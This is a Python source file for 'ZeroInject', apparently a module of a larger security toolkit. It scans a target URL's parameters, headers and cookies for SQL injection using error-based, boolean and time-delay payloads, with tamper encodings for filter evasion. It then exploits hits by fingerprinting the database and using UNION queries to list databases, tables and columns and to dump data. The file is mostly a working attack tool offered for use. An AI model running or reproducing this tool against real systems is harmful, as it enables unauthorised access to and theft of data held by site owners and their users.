#!/usr/bin/env python3
"""
ZeroInject - SQL Injection Module for ZeroScope
Author: Your Name
Date: YYYY-MM-DD
"""

import argparse
import requests
import urllib.parse
import time
import re
import json
import base64
from typing import Dict, List, Optional, Tuple, Union

class ZeroInject:
    def __init__(self, target_url: str, verbose: bool = False):
        self.target_url = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'ZeroInject/1.0',
            'Accept': '*/*',
            'Connection': 'keep-alive'
        })
        self.vulnerable_params = []
        self.dbms = None
        self.injection_points = []
        self.tamper_scripts = {
            'base64': lambda x: urllib.parse.quote_plus(base64.b64encode(x.encode()).decode()),
            'hex': lambda x: ''.join([f'%{ord(c):02x}' for c in x]),
            'doubleurl': lambda x: urllib.parse.quote_plus(urllib.parse.quote_plus(x))
        }

    def _make_request(self, method: str, params: Dict[str, str]) -> Optional[requests.Response]:
        """Make HTTP request with given parameters"""
        try:
            if method == 'GET':
                return self.session.get(self.target_url, params=params)
            elif method == 'POST':
                return self.session.post(self.target_url, data=params)
            else:
                return None
        except requests.exceptions.RequestException as e:
            if self.verbose:
                print(f"[-] Request failed: {e}")
            return None

    def _test_param(self, param: str, method: str, params: Dict[str, str], tamper: str = None) -> bool:
        """Test a parameter for SQLi with optional payload tampering"""
        if self.verbose:
            print(f"[*] Testing {method} parameter: {param}")

        # Original request
        orig_response = self._make_request(method, params)
        if not orig_response:
            return False

        orig_content = orig_response.text
        orig_length = len(orig_content)
        orig_code = orig_response.status_code

        # Test payloads
        payloads = self._generate_payloads(param, method, tamper)
        
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = payload['payload']
            response = self._make_request(method, test_params)
            
            if not response:
                continue

            # Check for database errors
            if self._check_errors(response.text, payload['type']):
                return True

            # Check for boolean-based anomalies
            if payload['type'] == 'boolean':
                false_response = self._make_request(
                    method, 
                    {**params, param: payload['false_payload']}
                )
                if false_response and len(response.text) != len(false_response.text):
                    return True

            # Check for time delays
            if payload['type'] == 'time' and response.elapsed.total_seconds() >= payload['delay']:
                return True

            # Check for content anomalies
            if len(response.text) != orig_length or response.status_code != orig_code:
                return True

        return False

    def _test_header(self, header: str, headers: Dict[str, str], tamper: str = None) -> bool:
        """Test a header for SQL injection vulnerabilities"""
        if self.verbose:
            print(f"[*] Testing header: {header}")

        orig_headers = self.session.headers.copy()
        orig_response = self.session.get(self.target_url)
        if not orig_response:
            return False

        orig_content = orig_response.text
        orig_length = len(orig_content)
        orig_code = orig_response.status_code

        # Test with payload
        test_headers = orig_headers.copy()
        payload = "' OR 1=1--"
        if tamper and tamper in self.tamper_scripts:
            payload = self.tamper_scripts[tamper](payload)
        test_headers[header] = payload
        
        self.session.headers.update(test_headers)
        response = self.session.get(self.target_url)

        # Check for errors or anomalies
        if response.status_code != orig_code or len(response.text) != orig_length:
            return True

        return False

    def _test_cookie(self, cookie: str, cookies: Dict[str, str], tamper: str = None) -> bool:
        """Test a cookie for SQL injection vulnerabilities"""
        if self.verbose:
            print(f"[*] Testing cookie: {cookie}")

        orig_cookies = self.session.cookies.get_dict()
        orig_response = self.session.get(self.target_url)
        if not orig_response:
            return False

        orig_content = orig_response.text
        orig_length = len(orig_content)
        orig_code = orig_response.status_code

        # Test with payload
        payload = "' OR 1=1--"
        if tamper and tamper in self.tamper_scripts:
            payload = self.tamper_scripts[tamper](payload)
        
        self.session.cookies.set(cookie, payload)
        response = self.session.get(self.target_url)

        # Check for errors or anomalies
        if response.status_code != orig_code or len(response.text) != orig_length:
            return True

        return False

    def _generate_payloads(self, param: str, method: str, tamper: str = None) -> List[Dict]:
        """Generate test payloads with optional tampering"""
        base_payloads = [
            # Error-based
            {"type": "error", "payload": "'", "dbms": "generic"},
            {"type": "error", "payload": "\"", "dbms": "generic"},
            {"type": "error", "payload": "' OR '1'='1", "dbms": "generic"},
            
            # Boolean-based
            {"type": "boolean", "payload": "' AND 1=1--", "false_payload": "' AND 1=2--", "dbms": "generic"},
            {"type": "boolean", "payload": "' OR 1=1#", "false_payload": "' OR 1=2#", "dbms": "generic"},
            
            # Time-based
            {"type": "time", "payload": "' AND SLEEP(5)--", "delay": 5, "dbms": "MySQL"},
            {"type": "time", "payload": "' AND pg_sleep(5)--", "delay": 5, "dbms": "PostgreSQL"},
            {"type": "time", "payload": "' WAITFOR DELAY '0:0:5'--", "delay": 5, "dbms": "SQL Server"},
        ]

        # Apply tampering if specified
        if tamper and tamper in self.tamper_scripts:
            for payload in base_payloads:
                payload['payload'] = self.tamper_scripts[tamper](payload['payload'])
                if 'false_payload' in payload:
                    payload['false_payload'] = self.tamper_scripts[tamper](payload['false_payload'])

        return base_payloads

    def _check_errors(self, response_text: str, payload_type: str) -> bool:
        """Check response for database error messages"""
        error_patterns = {
            'MySQL': r"SQL syntax.*MySQL|Warning.*mysql_.*|MySqlException",
            'PostgreSQL': r"PostgreSQL.*ERROR|Warning.*pg_.*|valid PostgreSQL result",
            'SQL Server': r"Microsoft SQL Server.*Error|Warning.*mssql_.*|Msg \d+",
            'Oracle': r"ORA-\d{5}|Oracle error|Oracle.*Driver",
            'SQLite': r"SQLite/JDBCDriver|SQLite.Exception"
        }

        for dbms, pattern in error_patterns.items():
            if re.search(pattern, response_text, re.IGNORECASE):
                if self.verbose:
                    print(f"[+] {dbms} error detected with {payload_type} payload")
                self.dbms = dbms
                return True
        return False

    def detect(self, params: Dict[str, str] = None, headers: Dict[str, str] = None, 
               cookies: Dict[str, str] = None, tamper: str = None) -> bool:
        """Detect SQL injection vulnerabilities with optional tampering"""
        print(f"[*] Scanning {self.target_url} for SQLi vulnerabilities")
        
        # Test GET parameters
        if '?' in self.target_url:
            url_parts = urllib.parse.urlparse(self.target_url)
            query_params = urllib.parse.parse_qs(url_parts.query)
            for param in query_params:
                if self._test_param(param, 'GET', query_params, tamper):
                    self.vulnerable_params.append((param, 'GET'))
                    self.injection_points.append(('GET', param))

        # Test POST parameters
        if params:
            for param in params:
                if self._test_param(param, 'POST', params, tamper):
                    self.vulnerable_params.append((param, 'POST'))
                    self.injection_points.append(('POST', param))

        # Test headers
        if headers:
            for header in headers:
                if self._test_header(header, headers, tamper):
                    self.vulnerable_params.append((header, 'HEADER'))
                    self.injection_points.append(('HEADER', header))

        # Test cookies
        if cookies:
            for cookie in cookies:
                if self._test_cookie(cookie, cookies, tamper):
                    self.vulnerable_params.append((cookie, 'COOKIE'))
                    self.injection_points.append(('COOKIE', cookie))

        return len(self.vulnerable_params) > 0

    def exploit(self, injection_point: Tuple[str, str], db: str = None, 
                table: str = None, column: str = None, dump: bool = False, 
                limit: int = 10) -> Optional[Dict]:
        """Exploit a confirmed SQL injection vulnerability"""
        if not self.dbms:
            print("[-] DBMS not detected. Running fingerprinting...")
            self._fingerprint_dbms()

        if not self.dbms:
            print("[-] Could not identify DBMS. Manual exploitation required.")
            return None

        print(f"[*] Exploiting {self.dbms} SQLi at {injection_point}")

        method, param = injection_point
        result = {}

        if not any([db, table, column, dump]):
            # Enumerate databases
            result['databases'] = self._enumerate_databases(method, param)
        elif db and not table and not column:
            # Enumerate tables
            result['tables'] = self._enumerate_tables(method, param, db)
        elif db and table and not column:
            # Enumerate columns
            result['columns'] = self._enumerate_columns(method, param, db, table)
        elif db and table and column and dump:
            # Dump data
            result['data'] = self._dump_column(method, param, db, table, column, limit)

        return result if any(result.values()) else None

    def _fingerprint_dbms(self) -> bool:
        """Fingerprint the database management system"""
        fingerprint_payloads = {
            'MySQL': ("' AND @@version LIKE '%MySQL%'--", r"@@version|MySQL"),
            'PostgreSQL': ("' AND version() LIKE '%PostgreSQL%'--", r"version\(\)|PostgreSQL"),
            'SQL Server': ("' AND @@version LIKE '%Microsoft SQL Server%'--", r"@@version|Microsoft SQL Server"),
            'Oracle': ("' AND banner LIKE '%Oracle%' FROM v$version--", r"banner|Oracle")
        }

        for dbms, (payload, pattern) in fingerprint_payloads.items():
            test_response = self._make_request('GET', {'test': payload})
            if test_response and re.search(pattern, test_response.text, re.IGNORECASE):
                self.dbms = dbms
                return True
        return False

    def _enumerate_databases(self, method: str, param: str) -> List[str]:
        """Enumerate databases using UNION-based technique"""
        queries = {
            'MySQL': "SELECT schema_name FROM information_schema.schemata",
            'PostgreSQL': "SELECT datname FROM pg_database",
            'SQL Server': "SELECT name FROM master..sysdatabases",
            'Oracle': "SELECT owner FROM all_tables GROUP BY owner"
        }

        if self.dbms not in queries:
            return []

        payload = f"' UNION SELECT NULL,({queries[self.dbms]})--"
        return self._execute_payload(method, param, payload)

    def _enumerate_tables(self, method: str, param: str, db: str) -> List[str]:
        """Enumerate tables in a database"""
        queries = {
            'MySQL': f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
            'PostgreSQL': f"SELECT table_name FROM information_schema.tables WHERE table_catalog='{db}'",
            'SQL Server': f"SELECT table_name FROM {db}.information_schema.tables",
            'Oracle': f"SELECT table_name FROM all_tables WHERE owner='{db.upper()}'"
        }

        if self.dbms not in queries:
            return []

        payload = f"' UNION SELECT NULL,({queries[self.dbms]})--"
        return self._execute_payload(method, param, payload)

    def _enumerate_columns(self, method: str, param: str, db: str, table: str) -> List[str]:
        """Enumerate columns in a table"""
        queries = {
            'MySQL': f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}'",
            'PostgreSQL': f"SELECT column_name FROM information_schema.columns WHERE table_catalog='{db}' AND table_name='{table}'",
            'SQL Server': f"SELECT column_name FROM {db}.information_schema.columns WHERE table_name='{table}'",
            'Oracle': f"SELECT column_name FROM all_tab_columns WHERE owner='{db.upper()}' AND table_name='{table.upper()}'"
        }

        if self.dbms not in queries:
            return []

        payload = f"' UNION SELECT NULL,({queries[self.dbms]})--"
        return self._execute_payload(method, param, payload)

    def _dump_column(self, method: str, param: str, db: str, table: str, column: str, limit: int) -> List[str]:
        """Dump data from a specific column"""
        limit_clauses = {
            'MySQL': f"LIMIT {limit}",
            'PostgreSQL': f"LIMIT {limit}",
            'SQL Server': f"TOP {limit}",
            'Oracle': f"WHERE ROWNUM <= {limit}"
        }

        if self.dbms not in limit_clauses:
            return []

        query = f"SELECT {column} FROM {db}.{table} {limit_clauses[self.dbms]}"
        payload = f"' UNION SELECT NULL,({query})--"
        return self._execute_payload(method, param, payload)

    def _execute_payload(self, method: str, param: str, payload: str) -> List[str]:
        """Execute a payload and extract results"""
        if method == 'GET':
            response = self.session.get(self.target_url, params={param: payload})
        elif method == 'POST':
            response = self.session.post(self.target_url, data={param: payload})
        else:
            return []

        if response.status_code == 200:
            return self._extract_data(response.text)
        return []

    def _extract_data(self, response_text: str) -> List[str]:
        """Extract data from response using simple pattern matching"""
        patterns = [
            r'<td[^>]*>([^<]+)</td>',
            r'<li[^>]*>([^<]+)</li>',
            r'<div[^>]*>([^<]+)</div>',
            r'value="([^"]+)"'
        ]

        results = set()
        for pattern in patterns:
            matches = re.findall(pattern, response_text)
            for match in matches:
                if len(match) > 3 and not match.isdigit():  # Basic filter
                    results.add(match.strip())

        return list(results)

    def save_results(self, results: Dict, filename: str, format: str = 'text'):
        """Save results to file in specified format"""
        try:
            with open(filename, 'w') as f:
                if format == 'json':
                    json.dump(results, f, indent=2)
                elif format == 'md':
                    self._save_markdown(results, f)
                else:
                    self._save_text(results, f)
            print(f"[+] Results saved to {filename} ({format.upper()})")
            return True
        except Exception as e:
            print(f"[-] Failed to save results: {e}")
            return False

    def _save_text(self, results: Dict, file_handle):
        for key, values in results.items():
            file_handle.write(f"{key.upper()}:\n")
            for value in values:
                file_handle.write(f"  - {value}\n")
            file_handle.write("\n")

    def _save_markdown(self, results: Dict, file_handle):
        file_handle.write("# ZeroInject SQLi Results\n\n")
        for key, values in results.items():
            file_handle.write(f"## {key.capitalize()}\n")
            for value in values:
                file_handle.write(f"- `{value}`\n")
            file_handle.write("\n")

def main():
    parser = argparse.ArgumentParser(
        description="ZeroInject - Advanced SQL Injection Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--detect", action="store_true", help="Run detection mode")
    parser.add_argument("--exploit", action="store_true", help="Run exploitation mode")
    parser.add_argument("--db", help="Database name for exploitation")
    parser.add_argument("--table", help="Table name for exploitation")
    parser.add_argument("--column", help="Column name for exploitation")
    parser.add_argument("--dump", action="store_true", help="Dump data from specified column")
    parser.add_argument("--limit", type=int, default=10, help="Limit rows to dump (default: 10)")
    parser.add_argument("--tamper", help="Tamper script to use (base64, hex, doubleurl)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-o", "--output", help="Output file path")
    parser.add_argument("--format", choices=['text', 'json', 'md'], default='text',
                        help="Output format (default: text)")

    args = parser.parse_args()

    print(r"""
     _____              ___           _       _     
    |__  /___ _ __ ___ |_ _|_ __  ___| |_ ___| |__  
      / // _ \ '_ ` _ \ | || '_ \/ __| __/ __| '_ \ 
     / /|  __/ | | | | | || | | \__ \ || (__| | | |
    /____\___|_| |_| |_|___|_| |_|___/\__\___|_| |_|
    """)

    scanner = ZeroInject(args.url, args.verbose)

    if args.detect:
        print("[*] Starting SQLi detection...")
        if scanner.detect(tamper=args.tamper):
            print("[+] SQL Injection vulnerabilities found!")
            for param, method in scanner.vulnerable_params:
                print(f"    - {method} parameter: {param}")
                if scanner.dbms:
                    print(f"        DBMS: {scanner.dbms}")
        else:
            print("[-] No SQL Injection vulnerabilities detected")

    if args.exploit:
        if not scanner.vulnerable_params:
            print("[-] No vulnerable parameters found. Running detection first...")
            if not scanner.detect(tamper=args.tamper):
                print("[-] No SQLi vulnerabilities found to exploit")
                return

        print("[*] Starting exploitation...")
        result = scanner.exploit(
            injection_point=scanner.injection_points[0],
            db=args.db,
            table=args.table,
            column=args.column,
            dump=args.dump,
            limit=args.limit
        )

        if result:
            print("[+] Exploitation successful!")
            for key, values in result.items():
                print(f"\n{key.upper()}:")
                for value in values:
                    print(f"    - {value}")

            if args.output:
                scanner.save_results(result, args.output, args.format)

if __name__ == "__main__":
    main()
